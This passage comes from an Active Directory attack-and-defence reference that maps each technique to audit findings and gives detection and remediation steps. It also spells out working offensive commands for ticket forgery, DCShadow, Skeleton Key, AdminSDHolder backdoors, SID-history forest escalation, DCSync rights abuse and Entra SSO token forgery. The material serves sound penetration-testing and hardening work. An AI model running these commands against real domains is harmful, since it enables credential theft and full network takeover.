**Close** — Rotate `krbtgt` password **twice** with a delay between (Active Directory Domain Services must replicate in between — typically 10h to match TGT lifetime). This is the only remediation. ADC-003 flags `krbtgt` password age > 180 days. After any suspected domain compromise, rotate `krbtgt` as first priority.

---

### 6.5 Silver / Diamond / Sapphire Tickets

| | |
|---|---|
| **ATT&CK** | T1558.002 |
| **Phase** | Domain dominance |
| **Min priv** | Service account NTLM hash (Silver); krbtgt + valid TGT (Diamond/Sapphire) |
| **Tools** | mimikatz, Rubeus, ticketer.py |
| **ad-recon finding** | ADC-040 |

**Attack vector**
- **Silver ticket**: Forged TGS for a specific service using the service account hash. Bypasses the KDC (no 4768/4769); harder to detect, limited to one service.
- **Diamond ticket**: Uses a real TGT from the KDC (less anomalous) then modifies the PAC in-flight.
- **Sapphire ticket**: Fully legitimate TGT obtained via S4U2Self impersonation.

**Commands**
```powershell
# Silver ticket — forge TGS for CIFS on fileserver using svc_sql hash
mimikatz kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /target:fileserver.corp.local /service:cifs /rc4:<svc-hash> /ptt

# Diamond ticket (Rubeus)
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
  /groups:512 /krbkey:<krbtgt-aes256> /nowrap
```

```bash
ticketer.py -nthash <svc-hash> -domain-sid S-1-5-21-... -domain corp.local \
  -spn cifs/fileserver.corp.local -target-domain corp.local Administrator
```

**Blue team**

**Origin** — Any host. Silver tickets bypass the DC entirely for the targeted service.

**Detect** — Silver tickets: Event 4627 (group membership in logon audit — forged PAC may show unusual groups). No 4768/4769 correlation on DC (silver ticket TGS not requested from KDC). AZUREADSSOACC$ (ADC-040) is a high-value silver ticket target because it allows forging service tickets accepted by Microsoft Online — rotate its Kerberos key every 30 days.

**Close** — Enforce AES-only service tickets (eliminate RC4 silver ticket path). Rotate service account passwords regularly. Rotate AZUREADSSOACC$ Kerberos key regularly (ADC-040). Implement PAC validation (`RequireMicrosoftAuth` on protected services).

---

### 6.6 DSRM / DCShadow / Skeleton Key

| | |
|---|---|
| **ATT&CK** | T1207, T1556.001 |
| **Phase** | Persistence |
| **Min priv** | Domain Admin |
| **Tools** | mimikatz |
| **ad-recon finding** | HOST-017 |

**Attack vector**
- **DSRM**: The Directory Services Restore Mode local Administrator account on each DC has a separate password. If `DsrmAdminLogonBehavior` is set to `2`, this account can log on interactively when the DC is online — a persistent DA-equivalent backdoor.
- **DCShadow**: Registers a rogue DC in AD, pushes arbitrary attribute changes (e.g., add SID history, set `msDS-AllowedToActOnBehalfOf`) without logging normal AD change events.
- **Skeleton Key**: Patches LSASS with a master password accepted alongside the real password for all domain accounts — non-persistent (survives until DC reboot).

**Commands**
```powershell
# DSRM — dump DSRM hash then set logon behavior
mimikatz lsadump::lsa /patch    # gets DSRM hash on DC
reg add "HKLM\...\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

# DCShadow — push attribute changes without proper replication logging
mimikatz "lsadump::dcshadow /object:attacker /attribute:SIDHistory /value:S-1-5-21-...-519"
mimikatz "lsadump::dcshadow /push"    # requires two simultaneous mimikatz instances

# Skeleton Key — patch all domain logons with 'mimikatz' as master password
mimikatz privilege::debug
mimikatz misc::skeleton
```

**Blue team**

**Origin** — DSRM: local on the DC; DCShadow: any host with DA rights; Skeleton Key: local on the DC (patches LSASS).

**Detect** — DSRM: `DsrmAdminLogonBehavior` registry value (HOST-017 checks this). DCShadow: replication partner anomalies (DC registered that isn't in the DC OU); Event 4929 (naming context replica removed) from unusual source. Skeleton Key: `sekurlsa` process patches to LSASS (Sysmon Event 10 — process access to lsass.exe).

**Close** — Set `DsrmAdminLogonBehavior = 0` (HOST-017). Change DSRM passwords regularly (not done by default). Monitor for rogue DCs via replication topology auditing. Detect LSASS patches via EDR/Credential Guard (Credential Guard prevents Skeleton Key entirely).

---

### 6.7 AdminSDHolder & ACL persistence

| | |
|---|---|
| **ATT&CK** | T1098 |
| **Phase** | Persistence |
| **Min priv** | Domain Admin (to modify AdminSDHolder) |
| **Tools** | PowerView, ADSIEDIT |
| **ad-recon findings** | ADC-019, GPO-013 |

**Attack vector**
`CN=AdminSDHolder,CN=System` is a template ACL. The SDProp process runs every 60 minutes and overwrites the ACL of all protected accounts (DA, EA, Schema Admins, etc.) with the AdminSDHolder ACL. An attacker with DA who adds an ACE to AdminSDHolder gets persistent, automatically re-applied control over all Tier-0 accounts — even if their own account is removed from DA.

**How the PTA performs it**
1. Add GenericAll or WriteDACL ACE to AdminSDHolder for a non-privileged account.
2. Wait up to 60 minutes for SDProp to propagate the ACE to all protected accounts.
3. Use the backdoor account to reset DA passwords, add group members, etc.

**Commands**
```powershell
# Add persistence ACE to AdminSDHolder
$acl = Get-Acl "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
  [Security.Principal.SecurityIdentifier]"S-1-5-21-...-<attacker-rid>",
  [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
  [System.Security.AccessControl.AccessControlType]::Allow)
$acl.AddAccessRule($ace)
Set-Acl -AclObject $acl "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"

# Trigger SDProp manually (instead of waiting 60 min)
$rootDse = [adsi]"LDAP://RootDSE"
$rootDse.Put("runProtectAdminGroupsTask", "1")
$rootDse.SetInfo()
```

**Blue team**

**Origin** — Any host where the DA account is authenticated. ACE added via LDAP.

**Detect** — Event 5136 (directory service object modified — `CN=AdminSDHolder`). Routine monitoring: compare AdminSDHolder ACL to a known-good baseline (what ADC-019 does). Any non-default ACE on AdminSDHolder is suspicious.

**Close** — Audit AdminSDHolder ACL regularly (ADC-019). Remove unexpected ACEs immediately. Restrict who can modify AD system container objects. Event 5136 alerting on AdminSDHolder modifications should be a Tier-0 alert.

---

## 7. Trusts & cross-forest

---

### 7.1 Trust enumeration

| | |
|---|---|
| **ATT&CK** | T1482 |
| **Phase** | Authenticated enumeration |
| **Min priv** | Any domain user |
| **Tools** | PowerView, nltest, BloodHound |
| **ad-recon finding** | ADC-010 |

**Attack vector**
Trust relationships define which domains/forests accept authentication from principals in another. Bidirectional trusts, transitive trusts, and trusts without SID filtering dramatically expand the attack surface.

**Commands**
```powershell
Get-DomainTrust
Get-ForestTrust
nltest /domain_trusts /all_trusts
```

```bash
bloodhound-python -c Trusts -u user -p pass -d corp.local -ns <dc>
```

**Blue team**

**Detect** — Enumerate trusts via LDAP and compare to authorized documentation. Transitive + bidirectional + no SID-filtering = high risk. ADC-010 flags SID filtering disabled on external/forest trusts.

**Close** — Enable SID filtering (quarantine) on all external and forest trusts. Disable selective authentication only when specifically required. Audit trust relationships annually.

---

### 7.2 Child-to-parent domain escalation (SID history)

| | |
|---|---|
| **ATT&CK** | T1134.005 |
| **Phase** | Cross-domain escalation |
| **Min priv** | DA in child domain |
| **Tools** | mimikatz, ticketer.py |
| **ad-recon finding** | ADC-021 |

**Attack vector**
Intra-forest trusts have no SID filtering by default. A DA in a child domain can forge a TGT with the Enterprise Admins SID (`S-1-5-21-<root-domain>-519`) in the `ExtraSids` field of the PAC — the root DC honors it, granting full forest access from a single child-domain compromise.

**Commands**
```bash
# Get root domain EA SID
Get-DomainGroup -Domain rootcorp.local -Identity "Enterprise Admins" | Select-Object objectsid

# Forge inter-realm ticket with extra SID
ticketer.py -nthash <child-krbtgt-hash> -domain-sid S-1-5-21-<child-sid> \
  -domain childcorp.local -extra-sid S-1-5-21-<root-sid>-519 -spn krbtgt/rootcorp.local attacker
```

```powershell
mimikatz kerberos::golden /user:attacker /domain:childcorp.local /sid:S-1-5-21-<child-sid> \
  /krbtgt:<child-krbtgt-hash> /sids:S-1-5-21-<root-sid>-519 /ptt
```

**Blue team**

**Origin** — Any host in the child domain once child DA is obtained.

**Detect** — Event 4768 on root DC with `ExtraSids` containing an EA SID from a non-root-domain account. Defender for Identity has a "Forged PAC" detection. Behavioral: a child-domain account exercising forest-root admin rights.

**Close** — Enable `SIDHistory` filtering on child-to-parent trust via `Set-ADObject` or `netdom trust childcorp.local /domain:rootcorp.local /enablesidhistory:no`. Treat child-domain DA as equivalent to forest-root compromise in your security model.

---

## 8. AD-adjacent infrastructure

---

### 8.1 SCCM / MECM network access account recovery

**Attack vector** — The SCCM Network Access Account (NAA) is stored encrypted on every managed client in WMI and in the SCCM site database. An attacker with local admin on any managed host can retrieve the NAA credentials, which often have broad network read access. Tools: `SharpSCCM`, `sccmhunter`.

**Blue team** — Audit NAA credentials (rotate frequently; use least-privilege account). Detect: WMI reads of `CCM_NetworkAccessAccount` class (Sysmon Event 20 — WMI EventFilter). Close: use SCCM client certificate authentication instead of NAA; remove NAA if not required.

---

### 8.2 WSUS unsigned update injection

**Attack vector** — If WSUS is HTTP (not HTTPS), a man-in-the-middle can intercept update downloads and inject a malicious update that runs as SYSTEM. Alternatively, with WSUS admin access, malicious updates can be pushed directly. Tools: `WSUSpendu`, `SharpWSUS`.

**Blue team** — Enforce HTTPS for WSUS (SSL on the WSUS web application). Require update signing. Audit WSUS admin group membership. Detect: unexpected software installation events (Event 11707/11724) from WSUS source.

---

### 8.3 Exchange PrivExchange / WriteDACL path

| | |
|---|---|
| **ATT&CK** | T1222.001 |
| **Phase** | Domain dominance |
| **ad-recon finding** | ADC-042 |

**Attack vector** — Exchange setup grants `EXCHANGE WINDOWS PERMISSIONS` group `WriteDACL` on the domain head. Any member of that group can add DCSync rights to any account — escalating Exchange admin to domain compromise.

**Commands**
```bash
# Check if Exchange group has WriteDACL
dacledit.py -action read -target "DC=corp,DC=local" corp.local/user:pass -dc-ip <dc> | grep -i exchange

# Abuse — grant DCSync to attacker account
dacledit.py -action write -rights DCSync -target "DC=corp,DC=local" \
  'corp.local/exchange_admin:pass' -dc-ip <dc> -principal attacker
```

**Blue team** — ADC-042 detects this. Run Microsoft's Exchange Health Checker to remove the ACE. Monitor Event 5136 for WriteDACL/WriteOwner additions on the domain root object.

---

### 8.4 ADIDNS wildcard / authenticated write

| | |
|---|---|
| **ATT&CK** | T1557.001 |
| **Phase** | Authenticated → credential access |
| **ad-recon findings** | DNS-001, DNS-002, DNS-003, DNS-007 |

**Attack vector** — By default, authenticated users can create DNS records in AD-integrated zones (the `CreateChild` right on the `MicrosoftDNS` container). An attacker can register a wildcard (`*`) A record or `wpad` entry pointing to their host, redirecting all name-resolution failures to themselves for NTLM capture.

**Commands**
```powershell
# Add wildcard DNS record (requires CreateChild on zone, or a DC account)
Invoke-DNSUpdate -DNSName "*" -DNSData <attacker-ip> -Verbose    # PowerMad

# Add WPAD
Invoke-DNSUpdate -DNSName "wpad" -DNSData <attacker-ip>
```

**Blue team** — DNS-002 (wildcard), DNS-003 (wpad/isatap), DNS-007 (write ACL) cover this. Restrict `CreateChild` on DNS zones to DNS Admins only. Enable DNS Audit logging. Block WPAD via proxy autoconfiguration GPO.

---

### 8.5 RODC credential caching abuse

| | |
|---|---|
| **ATT&CK** | T1552.004 |
| **Phase** | Credential access |
| **ad-recon finding** | ADC-041 |

**Attack vector** — RODCs cache passwords for accounts listed in `msDS-RevealOnDemandGroup`. If Tier-0 accounts (DA, krbtgt) are in the allow list, compromising the RODC (physically accessible in a branch office) yields those hashes.

**Blue team** — ADC-041 flags Tier-0 accounts in the RODC reveal list. Restrict `msDS-RevealOnDemandGroup` to only the accounts physically present at the RODC's site. Add Tier-0 accounts to `msDS-NeverRevealGroup`.

---

### 8.6 ADFS Golden SAML

**Attack vector** — The ADFS token-signing certificate private key, if stolen (from the AD FS server or from AD if stored there), allows forging SAML tokens for any federated identity — including cloud apps and Microsoft 365 tenants — without any on-prem network access. This is the ADFS equivalent of a Golden Ticket.

**Blue team** — Protect the AD FS token-signing certificate with an HSM. Rotate signing certificates annually. Monitor ADFS for token issuance to unexpected relying parties. Enable Entra/Azure AD sign-in logs to detect forged SAML tokens (anomalous logon properties).

---

### 8.7 Entra hybrid identity attacks

| | |
|---|---|
| **ATT&CK** | T1078.002, T1558.002 |
| **ad-recon findings** | ADC-039, ADC-040 |

**Attack vector**
- **Entra Connect sync account** (`MSOL_*`/`AZUREAD_*`): Has broad AD read rights (and often DCSync-equivalent). If its password is old or compromised, an attacker can use it to perform DCSync or enumerate cloud object relationships.
- **AZUREADSSOACC$** (Seamless SSO): Its Kerberos key is static (not auto-rotated). With DCSync rights, an attacker can obtain this key and forge Kerberos service tickets accepted by Microsoft Online — forging authentication to Office 365 as any synced user.

**Commands**
```bash
# Dump AZUREADSSOACC$ hash via DCSync
secretsdump.py corp.local/admin:pass@<dc> -just-dc-user 'AZUREADSSOACC$'

# Forge service ticket for Microsoft Online
ticketer.py -nthash <azureadssoacc-hash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn 'MSOLSpn' -target-domain microsoftonline.com administrator
```

**Blue team** — ADC-039 flags stale Entra sync account passwords. ADC-040 flags AZUREADSSOACC$ presence (prompt to verify rotation schedule). Rotate AZUREADSSOACC$ Kerberos key every 30 days via `Update-AzureADSSOForest`. Rotate Entra Connect sync account credentials via the connector wizard.

---

## 9. Notable CVEs

---

### 9.1 ZeroLogon (CVE-2020-1472)

**Attack vector** — Cryptographic flaw in Netlogon authentication allows any host to reset a DC's machine account password to empty without credentials — instant domain compromise. Netlogon secure channel signing (HOST-031) was not enforced by default pre-patch.

**Detect** — Event 4742 (DC machine account password reset) with `SubjectUserName` = `ANONYMOUS LOGON`. NetLogon channel anomalies. Defender for Identity has a specific ZeroLogon detection.

**Close** — Patch (KB4557222 and later). Enable `RequireSignOrSeal` and `SealSecureChannel` (HOST-031). The August 2020 patch added enforcement mode — verify it's applied.

---

### 9.2 PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

**Attack vector** — The Print Spooler service allows any authenticated user to load a printer driver DLL — which runs as SYSTEM. On DCs with Print Spooler enabled, this gives any domain user immediate DA (local SYSTEM on the DC = DA).

**Detect** — Process creation of `spoolsv.exe` loading unexpected DLLs (Sysmon Event 7 — ImageLoad). Event 808 in Microsoft-Windows-PrintService/Admin.

**Close** — Disable Print Spooler on all DCs (HOST-004, GPO-008). Apply patch (KB5004945). Block remote print driver loading via `RestrictDriverInstallationToAdministrators` registry key.

---

### 9.3 PetitPotam (MS-EFSRPC coercion)

**Attack vector** — The MS-EFSRPC interface (`EfsRpcOpenFileRaw`) can be called by any authenticated user (and in some versions unauthenticated) to coerce a target to authenticate over NTLM to an attacker-controlled host. Combined with NTLM relay to AD CS web enrollment (ESC8) or LDAP, this allows unauthenticated domain compromise on vulnerable configurations.

**Detect** — RPC calls to the `\pipe\lsarpc` or `\pipe\efsrpc` named pipes from unexpected hosts. EFSRPC service traffic on the DC's RPC port.

**Close** — Block `EfsRpcOpenFileRaw` by disabling EFS service or applying Microsoft's filter (KB5005413). Enable EPA on AD CS enrollment (ADCS-011). Require NTLM signing and channel binding. HOST-018 flags EFS service running on DCs.

---

### 9.4 PrivExchange (CVE-2019-0724)

**Attack vector** — Exchange's `PushNotification` feature causes Exchange servers to authenticate (with the Exchange machine account) to an attacker-supplied URL using NTLM. Relaying this to LDAP grants DCSync-equivalent rights because Exchange machine accounts have high privilege in AD by default.

**Close** — Apply KB4490059. Restrict Exchange delegation rights using the Exchange Health Checker DACL remediation script (ADC-042). Block NTLM relay from Exchange to domain controllers.

---

## 10. Tooling glossary

| Tool | Category | Use |
|---|---|---|
| **Impacket** | Framework | `secretsdump`, `GetUserSPNs`, `ntlmrelayx`, `psexec`, `wmiexec`, `lookupsid`, `ticketer`, `dacledit`, `rbcd`, `addcomputer`, `getST` |
| **BloodHound + SharpHound / bloodhound-python** | Graph analysis | Map all attack paths from low-priv to DA; identify ACL paths, delegation, session data |
| **PowerView / SharpView** | LDAP recon | PowerShell-native AD enumeration: users, SPNs, ACLs, trusts, GPOs, sessions |
| **Rubeus** | Kerberos | AS-REP/Kerberoast, S4U, ticket dump/inject/forge, PKINIT, certificate auth |
| **Certipy / Certify** | AD CS | ESC1–16 enumeration and exploitation, certificate request and auth |
| **mimikatz** | Credential access | LSASS dump, DCSync, Golden/Silver ticket, DCShadow, Skeleton Key, DPAPI |
| **Responder** | Poisoning | LLMNR/NBT-NS/mDNS/WPAD poisoning, NTLM hash capture |
| **mitm6** | IPv6 attack | Rogue DHCPv6 for NTLM relay via IPv6 |
| **ntlmrelayx** | Relay | Relay NTLM to SMB, LDAP, HTTP (AD CS); combine with Responder or mitm6 |
| **NetExec / CrackMapExec** | Mass auth | SMB/LDAP/WinRM enumeration and authentication at scale |
| **kerbrute** | Kerberos enum | Username enumeration and password spray via Kerberos |
| **evil-winrm** | Remote shell | WinRM shell via credentials or hash |
| **Whisker / pyWhisker** | Shadow creds | Write `msDS-KeyCredentialLink` for PKINIT persistence |
| **Powermad** | Machine accounts | Create machine accounts in domain; set RBCD attribute |
| **gMSADumper** | gMSA abuse | Retrieve gMSA `msDS-ManagedPassword` blob |
| **Snaffler / manspider** | File hunting | Recursive share search for credentials and sensitive data |
| **enum4linux-ng / ldapdomaindump / windapsearch** | Recon | Null session and authenticated LDAP enumeration |
| **PetitPotam / printerbug / DFSCoerce** | Coercion | Force DC NTLM authentication to attacker host |
| **SharpSCCM / sccmhunter** | SCCM | SCCM NAA credential recovery and site takeover |

---

## 11. Source index

- PayloadsAllTheThings / InternalAllTheThings: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/
- OSCP Checklist 2024: https://github.com/crtvrffnrt/OSCP-Checklist-Cheatsheet2024
- intotheewild OSCP AD Enumeration: https://github.com/intotheewild/OSCP-Checklist/blob/main/04.%20Active%20Directory%20Enumeration.md
- awesome-oscp: https://github.com/0x4D31/awesome-oscp
- hackerask pentesting cheatsheet: https://hackerask.com/posts/pentesting-cheatsheet/
- hackwithmike OSCP methodology: https://hackwithmike.gitbook.io/oscp/methodology/oscp-methodology
- duckwrites AD for OSCP (parts 1–3): https://duckwrites.medium.com/conquering-active-directory-for-oscp-essential-techniques-and-strategies-part-1-6f44d5469b47
- systemweakness OSCP strategy: https://systemweakness.com/6-vs-1-battle-my-oscp-strategy-dd23cc0e912b
- cavementech AD reference: https://notes.cavementech.com/pentesting/active-directory
- flashgenius OSCP AD cheat sheet: https://flashgenius.net/oscp-ad-cheat-sheet
- brianlam38 OSCP AD cheatsheet: https://github.com/brianlam38/OSCP/blob/main/cheatsheet-active-directory.md
- infosecwriteups OSCP AD tools: https://infosecwriteups.com/how-i-attacked-active-directory-during-oscp-labs-and-what-tools-actually-worked-8a10e12930a4
- AD-Attacks-by-Service: https://github.com/AD-Attacks/AD-Attacks-by-Service
